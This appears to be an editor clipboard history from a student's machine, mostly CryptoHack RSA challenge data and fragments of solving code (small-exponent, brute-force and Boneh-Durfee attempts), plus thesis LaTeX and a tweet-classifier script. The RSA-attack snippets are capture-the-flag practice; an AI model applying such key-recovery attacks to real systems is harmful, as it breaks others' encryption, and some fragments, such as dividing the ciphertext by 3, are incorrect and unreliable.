	580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637
19e84b61f48c85a115e14b2cfa32007c|file:///home/neo/cryptohack/rsa/prime1/manyprime.py|9|1|V|python
	    n = 580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637
3de8f281b190ddd0ea73bbe627093b12|file:///home/neo/.vimrc|55|1|V|vim
	set number relativenumber
	set wildmode=longest,list,full
	set splitbelow splitright
	set showcmd
736d54a6a812400778beecc9104aab0a|file:///home/neo/cryptohack/rsa/exponent/output.py|1|1|V|python
	n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767                                                                  
	e = 1
	ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485
8bb635441563240c623c3b2cd62fdd4f|file:///home/neo/cryptohack/rsa/exponent/salty.py|9|1|V|python
	e = 1
4b587717da217ba67e84c3e180bc51b6|file:///home/neo/cryptohack/rsa/exponent/salty.py|5|1|V|python
	n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767                                                                  
35922f6d1a9079134a617c1fb9fa9504|file:///home/neo/cryptohack/rsa/exponent/salty.py|5|5|v|python
	110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767                                                                  
074cd7a36b22df478b4abefd7b62028e|file:///home/neo/cryptohack/rsa/exponent/salty.py|7|1|V|python
	ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485
83c704f856b53a91b3758255b9bb6711|file:///home/neo/cryptohack/rsa/exponent/output_30cff153b7432055fc947fc5abdb57d3.txt|1|1|V|text
	n = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883
	e = 3
	ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957
08cc6664d7c0e6861e4e0da6a611cd9e|file:///home/neo/cryptohack/rsa/exponent/modulus_inutilis.py|5|5|v|python
	17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883
73d5342eba070f636ac3246f319bf77f|file:///home/neo/Documents/thesis/architecture.tex|1|2|v|tex
	section
9b409f20bd59e172685a0147bb77d7a3|file:///home/neo/Documents/thesis/architecture.tex|28|58|v|tex
	 The client requests the web application from the server (1). The server responds by sending the html file, which directs the client to retrieve {\tt auth.js
baf891c15fea3942e850ec326cb62d10|file:///home/neo/Documents/thesis/architecture.tex|28|58|v|tex
	 from a trusted third party, as well as with a JavaScript file in which the authentication options are initialized (2). The client then retrieves {\tt auth.js
74a468b5e37a6988d9d87399fec48130|file:///home/neo/Documents/thesis/architecture.tex|28|58|v|tex
	 from the trusted source (3 and 4). The client's browser prompts the user for a password and the register API call from {\tt auth.js
2fe945e29a00a6a6d1136f334d06d40d|file:///home/neo/Documents/thesis/architecture.tex|28|58|v|tex
	 is used to generate the correct credential (5). In this case the generated credential is the user's public key, which is generated based on the password which the user provided. Finally, the credential is sent to the server (6), where it will be verified.
572a35c231a280865a100b7350615147|file:///home/neo/Documents/thesis/architecture.tex|22|262|v|tex
	, as seen in Figure~\ref{fig:architecture}
ee1892a7805d5d1a3f5c9d5e58c3bfb8|file:///home/neo/Documents/thesis/architecture.tex|28|1|v|tex
	  \caption{Overview of the architecture of {\tt auth.
20651c3cec9930668ecf4ebee44906bd|file:///home/neo/Documents/thesis/architecture.tex|28|58|v|tex
	 The client requests the web application from the server (1). The server responds by sending the html file, which directs the client to retrieve {\tt auth.js} from a trusted third party, as well as with a JavaScript file in which the authentication options are initialized (2). The client then retrieves {\tt auth.js} from the trusted source (3 and 4). The client's browser prompts the user for a password and the register API call from {\tt auth.js} is used to generate the correct credential (5). In this case the generated credential is the user's public key, which is generated based on the password which the user provided. Finally, the credential is sent to the server (
14ff7087f70fe899f0159deb8dbfaa20|file:///home/neo/cryptohack/rsa/exponent/modulus_inutilis.py|19|1|V|python
	print(pt)
f84c25cb9e3087b607fd5aacef33c38e|file:///home/neo/cryptohack/rsa/exponent/modulus_inutilis.py|6|1|V|python
	ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957
8838c2a898247ae6f98c5a221210cd80|file:///home/neo/cryptohack/rsa/exponent/modulus_inutilis.py|18|1|V|python
	pt = ct // 3
0f53db4c2f15f393e782ae6e97d7d0dd|file:///home/neo/cryptohack/rsa/exponent/output_db0dde905e9e9b3648070985550a1fad.txt|1|1|V|text
	N = 0x8da7d2ec7bf9b322a539afb9962d4d2ebeb3e3d449d709b80a51dc680a14c87ffa863edfc7b5a2a542a0fa610febe2d967b58ae714c46a6eccb44cd5c90d1cf5e271224aa3367e5a13305f2744e2e56059b17bf520c95d521d34fdad3b0c12e7821a3169aa900c711e6923ca1a26c71fc5ac8a9ff8c878164e2434c724b68b508a030f86211c1307b6f90c0cd489a27fdc5e6190f6193447e0441a49edde165cf6074994ea260a21ea1fc7e2dfb038df437f02b9ddb7b5244a9620c8eca858865e83bab3413135e76a54ee718f4e431c29d3cb6e353a75d74f831bed2cc7bdce553f25b617b3bdd9ef901e249e43545c91b0cd8798b27804d61926e317a2b745
	e = 0x86d357db4e1b60a2e9f9f25e2db15204c820b6e8d8d04d29db168c890bc8a6c1e31b9316c9680174e128515a00256b775a1a8ccca9c6936f1b4c2298c03032cda4dd8eca1145828d31466bf56bfcf0c6a8b4a1b2fb27de7a57fae7430048d7590734b2f05b6443ad60d89606802409d2fa4c6767ad42bffae01a8ef1364418362e133fa7b2770af64a68ad50ad8d2bd5cebb99ceb13368fb31a6e7503e753f8638e21a96af1b6498c18578ba89b98d70fa482ad137d28fe701b4b77baa25d5e84c81b26ee9bddf8cbb51a071c60dd57714de379cd4bc14932809ba18524a0a18e4133665cfc46e2c4fcfbc28e0a0957e5513a7307c422b87a6182d0b6a074b4d
	c = 0x6a2f2e401a54eeb5dab1e6d5d80e92a6ca189049e22844c825012b8f0578f95b269b19644c7c8af3d544840d380ed75fdf86844aa8976622fa0501eaec0e5a1a5ab09d3d1037e55501c4e270060470c9f4019ced6c4e67673843daf2fd71c64f3dd8939ae322f2b79d283b3382052d076ebe9bb50b0042f1f7dd7beadf0f5686926ade9fc8370283ead781a21896e7a878d99e77c3bb1f470401062c0e0327fd85da1cf12901635f1df310e8f8c7d87aff5a01dbbecd739cd8f36462060d0eb237af8d613e2d9cebb67d612bcfc353ef2cd44b7ac85e471287eb04ae9b388b66ea8eb32429ae96dba5da8206894fa8c58a7440a127fceb5717a2eaa3c29f25f7
2e2c9aa8b95791a7be025cfd876ee2dc|file:///home/neo/cryptohack/rsa/exponent/everything_big.py|25|1|V|python
	print(N/e)
21aadf85dc2d2399614f08cba9f22298|file:///home/neo/cryptohack/rsa/exponent/boneh_durfee.sage|275|5|V|python
	    N = 0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db
094be0a6883744c9bc51b3ac2e120f76|file:///home/neo/cryptohack/rsa/exponent/boneh_durfee.sage|276|5|V|python
	    e = 0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517
be83cf5f44ff5cef8a93d429f76d843a|file:///home/neo/cryptohack/rsa/exponent/everything_big.py|8|1|V|python
	N = 0x8da7d2ec7bf9b322a539afb9962d4d2ebeb3e3d449d709b80a51dc680a14c87ffa863edfc7b5a2a542a0fa610febe2d967b58ae714c46a6eccb44cd5c90d1cf5e271224aa3367e5a13305f2744e2e56059b17bf520c95d521d34fdad3b0c12e7821a3169aa900c711e6923ca1a26c71fc5ac8a9ff8c878164e2434c724b68b508a030f86211c1307b6f90c0cd489a27fdc5e6190f6193447e0441a49edde165cf6074994ea260a21ea1fc7e2dfb038df437f02b9ddb7b5244a9620c8eca858865e83bab3413135e76a54ee718f4e431c29d3cb6e353a75d74f831bed2cc7bdce553f25b617b3bdd9ef901e249e43545c91b0cd8798b27804d61926e317a2b745
d4833a8e6adafc5270a2d24b4b1f2a80|file:///home/neo/cryptohack/rsa/exponent/everything_big.py|9|1|V|python
	e = 0x86d357db4e1b60a2e9f9f25e2db15204c820b6e8d8d04d29db168c890bc8a6c1e31b9316c9680174e128515a00256b775a1a8ccca9c6936f1b4c2298c03032cda4dd8eca1145828d31466bf56bfcf0c6a8b4a1b2fb27de7a57fae7430048d7590734b2f05b6443ad60d89606802409d2fa4c6767ad42bffae01a8ef1364418362e133fa7b2770af64a68ad50ad8d2bd5cebb99ceb13368fb31a6e7503e753f8638e21a96af1b6498c18578ba89b98d70fa482ad137d28fe701b4b77baa25d5e84c81b26ee9bddf8cbb51a071c60dd57714de379cd4bc14932809ba18524a0a18e4133665cfc46e2c4fcfbc28e0a0957e5513a7307c422b87a6182d0b6a074b4d
2a05410f0b2eaef2d8496ea130b4a740|file:///home/neo/cryptohack/rsa/exponent/everything_big.py|31|1|V|python
	for d in range(1000000):
1da09c8baa94a1b3228a5c7706f7a571|file:///home/neo/cryptohack/rsa/exponent/everything_big.py|31|1|V|python
	    pt = pow(c, d, N)
	    decrypted = long_to_bytes(pt)
	    if b'crypto' in decrypted:
	        print(decrypted)
c76f213e6a300a015a635ff2f88b20f3|file:///home/neo/vimwiki/Crypto.wiki|1|1|v|vimwiki
	### RSA ###
a4206dbf7d7d31e0caf8906ab7269cf4|file:///home/neo/cryptohack/rsa/exponent/output_9e4e9f8ce79f26643604e53be054389c.txt|1|1|V|text
	N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9
	e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d
	c = 0x503d5dd3bf3d76918b868c0789c81b4a384184ddadef81142eabdcb78656632e54c9cb22ac2c41178607aa41adebdf89cd24ec1876365994f54f2b8fc492636b59382eb5094c46b5818cf8d9b42aed7e8051d7ca1537202d20ef945876e94f502e048ad71c7ad89200341f8071dc73c2cc1c7688494cad0110fca4854ee6a1ba999005a650062a5d55063693e8b018b08c4591946a3fc961dae2ba0c046f0848fbe5206d56767aae8812d55ee9decc1587cf5905887846cd3ecc6fc069e40d36b29ee48229c0c79eceab9a95b11d15421b8585a2576a63b9f09c56a4ca1729680410da237ac5b05850604e2af1f4ede9cf3928cbb3193a159e64482928b585ac
3908943ebf5b35da9a979d070bf9ec2c|file:///home/neo/cryptohack/rsa/exponent/boneh_durfee.sage.py|281|5|V|python
	    N = _sage_const_0x8da7d2ec7bf9b322a539afb9962d4d2ebeb3e3d449d709b80a51dc680a14c87ffa863edfc7b5a2a542a0fa610febe2d967b58ae714c46a6eccb44cd5c90d1cf5e271224aa3367e5a13305f2744e2e56059b17bf520c95d521d34fdad3b0c12e7821a3169aa900c711e6923ca1a26c71fc5ac8a9ff8c878164e2434c724b68b508a030f86211c1307b6f90c0cd489a27fdc5e6190f6193447e0441a49edde165cf6074994ea260a21ea1fc7e2dfb038df437f02b9ddb7b5244a9620c8eca858865e83bab3413135e76a54ee718f4e431c29d3cb6e353a75d74f831bed2cc7bdce553f25b617b3bdd9ef901e249e43545c91b0cd8798b27804d61926e317a2b745 
8610079f8bef4428a8e23ff40d1a3fe1|file:///home/neo/cryptohack/rsa/exponent/boneh_durfee.sage.py|282|5|V|python
	    e = _sage_const_0x86d357db4e1b60a2e9f9f25e2db15204c820b6e8d8d04d29db168c890bc8a6c1e31b9316c9680174e128515a00256b775a1a8ccca9c6936f1b4c2298c03032cda4dd8eca1145828d31466bf56bfcf0c6a8b4a1b2fb27de7a57fae7430048d7590734b2f05b6443ad60d89606802409d2fa4c6767ad42bffae01a8ef1364418362e133fa7b2770af64a68ad50ad8d2bd5cebb99ceb13368fb31a6e7503e753f8638e21a96af1b6498c18578ba89b98d70fa482ad137d28fe701b4b77baa25d5e84c81b26ee9bddf8cbb51a071c60dd57714de379cd4bc14932809ba18524a0a18e4133665cfc46e2c4fcfbc28e0a0957e5513a7307c422b87a6182d0b6a074b4d 
f4ab7249bbe0bcee086d646463a73c72|file:///home/neo/cryptohack/rsa/exponent/still_big.py|24|1|V|python
	N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9
21b1fc07cd4a276119c181f4028c1fd0|file:///home/neo/CTFs/scripts/crypto/boneh_durfee.sage|275|1|V|python
	    N = 0x8da7d2ec7bf9b322a539afb9962d4d2ebeb3e3d449d709b80a51dc680a14c87ffa863edfc7b5a2a542a0fa610febe2d967b58ae714c46a6eccb44cd5c90d1cf5e271224aa3367e5a13305f2744e2e56059b17bf520c95d521d34fdad3b0c12e7821a3169aa900c711e6923ca1a26c71fc5ac8a9ff8c878164e2434c724b68b508a030f86211c1307b6f90c0cd489a27fdc5e6190f6193447e0441a49edde165cf6074994ea260a21ea1fc7e2dfb038df437f02b9ddb7b5244a9620c8eca858865e83bab3413135e76a54ee718f4e431c29d3cb6e353a75d74f831bed2cc7bdce553f25b617b3bdd9ef901e249e43545c91b0cd8798b27804d61926e317a2b745
60cff07c173fcc21347537a73eb5db2a|file:///home/neo/cryptohack/rsa/exponent/still_big.py|25|1|V|python
	e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d
ba42b2edb62ffbdb8a3f31bc7c043e26|file:///home/neo/CTFs/scripts/crypto/boneh_durfee.sage|278|5|V|python
	    e = 0x86d357db4e1b60a2e9f9f25e2db15204c820b6e8d8d04d29db168c890bc8a6c1e31b9316c9680174e128515a00256b775a1a8ccca9c6936f1b4c2298c03032cda4dd8eca1145828d31466bf56bfcf0c6a8b4a1b2fb27de7a57fae7430048d7590734b2f05b6443ad60d89606802409d2fa4c6767ad42bffae01a8ef1364418362e133fa7b2770af64a68ad50ad8d2bd5cebb99ceb13368fb31a6e7503e753f8638e21a96af1b6498c18578ba89b98d70fa482ad137d28fe701b4b77baa25d5e84c81b26ee9bddf8cbb51a071c60dd57714de379cd4bc14932809ba18524a0a18e4133665cfc46e2c4fcfbc28e0a0957e5513a7307c422b87a6182d0b6a074b4d
68f3c71d84dc27fd3615fc848aac1a13|file:///home/neo/cryptohack/rsa/exponent/everything_big.py|8|1|V|python
	N = 0x8da7d2ec7bf9b322a539afb9962d4d2ebeb3e3d449d709b80a51dc680a14c87ffa863edfc7b5a2a542a0fa610febe2d967b58ae714c46a6eccb44cd5c90d1cf5e271224aa3367e5a13305f2744e2e56059b17bf520c95d521d34fdad3b0c12e7821a3169aa900c711e6923ca1a26c71fc5ac8a9ff8c878164e2434c724b68b508a030f86211c1307b6f90c0cd489a27fdc5e6190f6193447e0441a49edde165cf6074994ea260a21ea1fc7e2dfb038df437f02b9ddb7b5244a9620c8eca858865e83bab3413135e76a54ee718f4e431c29d3cb6e353a75d74f831bed2cc7bdce553f25b617b3bdd9ef901e249e43545c91b0cd8798b27804d61926e317a2b745
	e = 0x86d357db4e1b60a2e9f9f25e2db15204c820b6e8d8d04d29db168c890bc8a6c1e31b9316c9680174e128515a00256b775a1a8ccca9c6936f1b4c2298c03032cda4dd8eca1145828d31466bf56bfcf0c6a8b4a1b2fb27de7a57fae7430048d7590734b2f05b6443ad60d89606802409d2fa4c6767ad42bffae01a8ef1364418362e133fa7b2770af64a68ad50ad8d2bd5cebb99ceb13368fb31a6e7503e753f8638e21a96af1b6498c18578ba89b98d70fa482ad137d28fe701b4b77baa25d5e84c81b26ee9bddf8cbb51a071c60dd57714de379cd4bc14932809ba18524a0a18e4133665cfc46e2c4fcfbc28e0a0957e5513a7307c422b87a6182d0b6a074b4d
b192e211d0b9127f845abfc131417950|file:///home/neo/Documents/epl448/disaster-tweets/svc_best.py|38|1|V|python
	### Choose if you want dense data
	if 'dense' in sys.argv:
		dense = True
		out_string = out_string +'dense '
	### Choose vectorizer
	if 'tfidf' in sys.argv:
		tfidf = True
		out_string = out_string +'tfidf '
	### Choose min threshold for words to keep
	min_frequency_threshold = 15
	### Clear data using the clear_text function
	if 'clear_data' in sys.argv:
		clear_data = True
		out_string = out_string +'clear_data '
	### Choose if you want to stem words
	if 'stem' in sys.argv:
		stem = True
		out_string = out_string +'stem '
	### Choose if you want to lemmatize words
	if 'lemmatize' in sys.argv:
		lemmatize = True
		out_string = out_string +'lemmatize '
	### Choose if you want to add the locations to the tweets
	if 'add_location' in sys.argv:
		add_location = True
		out_string = out_string +'add_location '
	### Choose if you want to add the keywords to the tweets (after the data clearing)
	if 'add_keywords' in sys.argv:
		add_keywords = True
		out_string = out_string +'add_keywords'
21b097011f16417e07769cfae30b067f|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|1|1|V|text
	n = 14528915758150659907677315938876872514853653132820394367681510019000469589767908107293777996420037715293478868775354645306536953789897501630398061779084810058931494642860729799059325051840331449914529594113593835549493208246333437945551639983056810855435396444978249093419290651847764073607607794045076386643023306458718171574989185213684263628336385268818202054811378810216623440644076846464902798568705083282619513191855087399010760232112434412274701034094429954231366422968991322244343038458681255035356984900384509158858007713047428143658924970374944616430311056440919114824023838380098825914755712289724493770021
	e = 3
	c = 6965891612987861726975066977377253961837139691220763821370036576350605576485706330714192837336331493653283305241193883593410988132245791554283874785871849223291134571366093850082919285063130119121338290718389659761443563666214229749009468327825320914097376664888912663806925746474243439550004354390822079954583102082178617110721589392875875474288168921403550415531707419931040583019529612270482482718035497554779733578411057633524971870399893851589345476307695799567919550426417015815455141863703835142223300228230547255523815097431420381177861163863791690147876158039619438793849367921927840731088518955045807722225
	
	
	n = 20463913454649855046677206889944639231694511458416906994298079596685813354570085475890888433776403011296145408951323816323011550738170573801417972453504044678801608709931200059967157605416809387753258251914788761202456830940944486915292626560515250805017229876565916349963923702612584484875113691057716315466239062005206014542088484387389725058070917118549621598629964819596412564094627030747720659155558690124005400257685883230881015636066183743516494701900125788836869358634031031172536767950943858472257519195392986989232477630794600444813136409000056443035171453870906346401936687214432176829528484662373633624123
	e = 3
	c = 5109363605089618816120178319361171115590171352048506021650539639521356666986308721062843132905170261025772850941702085683855336653472949146012700116070022531926476625467538166881085235022484711752960666438445574269179358850309578627747024264968893862296953506803423930414569834210215223172069261612934281834174103316403670168299182121939323001232617718327977313659290755318972603958579000300780685344728301503641583806648227416781898538367971983562236770576174308965929275267929379934367736694110684569576575266348020800723535121638175505282145714117112442582416208209171027273743686645470434557028336357172288865172
	
	
	n = 19402640770593345339726386104915705450969517850985511418263141255686982818547710008822417349818201858549321868878490314025136645036980129976820137486252202687238348587398336652955435182090722844668488842986318211649569593089444781595159045372322540131250208258093613844753021272389255069398553523848975530563989367082896404719544411946864594527708058887475595056033713361893808330341623804367785721774271084389159493974946320359512776328984487126583015777989991635428744050868653379191842998345721260216953918203248167079072442948732000084754225272238189439501737066178901505257566388862947536332343196537495085729147
	e = 3
	c = 5603386396458228314230975500760833991383866638504216400766044200173576179323437058101562931430558738148852367292802918725271632845889728711316688681080762762324367273332764959495900563756768440309595248691744845766607436966468714038018108912467618638117493367675937079141350328486149333053000366933205635396038539236203203489974033629281145427277222568989469994178084357460160310598260365030056631222346691527861696116334946201074529417984624304973747653407317290664224507485684421999527164122395674469650155851869651072847303136621932989550786722041915603539800197077294166881952724017065404825258494318993054344153
	
	
	n = 12005639978012754274325188681720834222130605634919280945697102906256738419912110187245315232437501890545637047506165123606573171374281507075652554737014979927883759915891863646221205835211640845714836927373844277878562666545230876640830141637371729405545509920889968046268135809999117856968692236742804637929866632908329522087977077849045608566911654234541526643235586433065170392920102840518192803854740398478305598092197183671292154743153130012885747243219372709669879863098708318993844005566984491622761795349455404952285937152423145150066181043576492305166964448141091092142224906843816547235826717179687198833961
	e = 3
	c = 1522280741383024774933280198410525846833410931417064479278161088248621390305797210285777845359812715909342595804742710152832168365433905718629465545306028275498667935929180318276445229415104842407145880223983428713335709038026249381363564625791656631137936935477777236936508600353416079028339774876425198789629900265348122040413865209592074731028757972968635601695468594123523892918747882221891834598896483393711851510479989203644477972694520237262271530260496342247355761992646827057846109181410462131875377404309983072358313960427035348425800940661373272947647516867525052504539561289941374722179778872627956360577
	
	
	n = 17795451956221451086587651307408104001363221003775928432650752466563818944480119932209305765249625841644339021308118433529490162294175590972336954199870002456682453215153111182451526643055812311071588382409549045943806869173323058059908678022558101041630272658592291327387549001621625757585079662873501990182250368909302040015518454068699267914137675644695523752851229148887052774845777699287718342916530122031495267122700912518207571821367123013164125109174399486158717604851125244356586369921144640969262427220828940652994276084225196272504355264547588369516271460361233556643313911651916709471353368924621122725823
	e = 3
	c = 8752507806125480063647081749506966428026005464325535765874589376572431101816084498482064083887400646438977437273700004934257274516197148448425455243811009944321764771392044345410680448204581679548854193081394891841223548418812679441816502910830861271884276608891963388657558218620911858230760629700918375750796354647493524576614017731938584618983084762612414591830024113057983483156974095503392359946722756364412399187910604029583464521617256125933111786441852765229820406911991809039519015434793656710199153380699319611499255869045311421603167606551250174746275803467549814529124250122560661739949229005127507540805
	
	
	n = 25252721057733555082592677470459355315816761410478159901637469821096129654501579313856822193168570733800370301193041607236223065376987811309968760580864569059669890823406084313841678888031103461972888346942160731039637326224716901940943571445217827960353637825523862324133203094843228068077462983941899571736153227764822122334838436875488289162659100652956252427378476004164698656662333892963348126931771536472674447932268282205545229907715893139346941832367885319597198474180888087658441880346681594927881517150425610145518942545293750127300041942766820911120196262215703079164895767115681864075574707999253396530263
	e = 3
	c = 23399624135645767243362438536844425089018405258626828336566973656156553220156563508607371562416462491581383453279478716239823054532476006642583363934314982675152824147243749715830794488268846671670287617324522740126594148159945137948643597981681529145611463534109482209520448640622103718682323158039797577387254265854218727476928164074249568031493984825273382959147078839665114417896463735635546290504843957780546550577300001452747760982468547756427137284830133305010038339400230477403836856663883956463830571934657200851598986174177386323915542033293658596818231793744261192870485152396793393026198817787033127061749
	
	
	n = 19833203629283018227011925157509157967003736370320129764863076831617271290326613531892600790037451229326924414757856123643351635022817441101879725227161178559229328259469472961665857650693413215087493448372860837806619850188734619829580286541292997729705909899738951228555834773273676515143550091710004139734080727392121405772911510746025807070635102249154615454505080376920778703360178295901552323611120184737429513669167641846902598281621408629883487079110172218735807477275590367110861255756289520114719860000347219161944020067099398239199863252349401303744451903546571864062825485984573414652422054433066179558897
	e = 3
	c = 15239683995712538665992887055453717247160229941400011601942125542239446512492703769284448009141905335544729440961349343533346436084176947090230267995060908954209742736573986319254695570265339469489948102562072983996668361864286444602534666284339466797477805372109723178841788198177337648499899079471221924276590042183382182326518312979109378616306364363630519677884849945606288881683625944365927809405420540525867173639222696027472336981838588256771671910217553150588878434061862840893045763456457939944572192848992333115479951110622066173007227047527992906364658618631373790704267650950755276227747600169403361509144
3cc6482e3a8217c4d87925bb5a1cd783|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|3|5|v|text
	6965891612987861726975066977377253961837139691220763821370036576350605576485706330714192837336331493653283305241193883593410988132245791554283874785871849223291134571366093850082919285063130119121338290718389659761443563666214229749009468327825320914097376664888912663806925746474243439550004354390822079954583102082178617110721589392875875474288168921403550415531707419931040583019529612270482482718035497554779733578411057633524971870399893851589345476307695799567919550426417015815455141863703835142223300228230547255523815097431420381177861163863791690147876158039619438793849367921927840731088518955045807722225
1f29181286560874fe0b104a938b43f4|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|1|5|v|text
	14528915758150659907677315938876872514853653132820394367681510019000469589767908107293777996420037715293478868775354645306536953789897501630398061779084810058931494642860729799059325051840331449914529594113593835549493208246333437945551639983056810855435396444978249093419290651847764073607607794045076386643023306458718171574989185213684263628336385268818202054811378810216623440644076846464902798568705083282619513191855087399010760232112434412274701034094429954231366422968991322244343038458681255035356984900384509158858007713047428143658924970374944616430311056440919114824023838380098825914755712289724493770021
5c96f2aa8fe29e995418dd1f0c586c96|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|6|5|v|text
	20463913454649855046677206889944639231694511458416906994298079596685813354570085475890888433776403011296145408951323816323011550738170573801417972453504044678801608709931200059967157605416809387753258251914788761202456830940944486915292626560515250805017229876565916349963923702612584484875113691057716315466239062005206014542088484387389725058070917118549621598629964819596412564094627030747720659155558690124005400257685883230881015636066183743516494701900125788836869358634031031172536767950943858472257519195392986989232477630794600444813136409000056443035171453870906346401936687214432176829528484662373633624123
055e7137880f8ba0e0ea09717c18451c|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|8|5|v|text
	5109363605089618816120178319361171115590171352048506021650539639521356666986308721062843132905170261025772850941702085683855336653472949146012700116070022531926476625467538166881085235022484711752960666438445574269179358850309578627747024264968893862296953506803423930414569834210215223172069261612934281834174103316403670168299182121939323001232617718327977313659290755318972603958579000300780685344728301503641583806648227416781898538367971983562236770576174308965929275267929379934367736694110684569576575266348020800723535121638175505282145714117112442582416208209171027273743686645470434557028336357172288865172
c37a155679c4cf874f1778b9f083de12|file:///home/neo/cryptohack/rsa/exponent/output_johan.txt|11|5|v|text
	19402640770593345339726386104915705450969517850985511418263141255686982818547710008822417349818201858549321868878490314025136645036980129976820137486252202687238348587398336652955435182090722844668488842986318211649569593089444781595159045372322540131250208258093613844753021272389255069398553523848975530563989367082896404719544411946864594527708058887475595056033713361893808330341623804367785721774271084389159493974946320359512776328984487126583015777989991635428744050868653379191842998345721260216953918203248167079072442948732000084754225272238189439501737066178901505257566388862947536332343196537495085729147
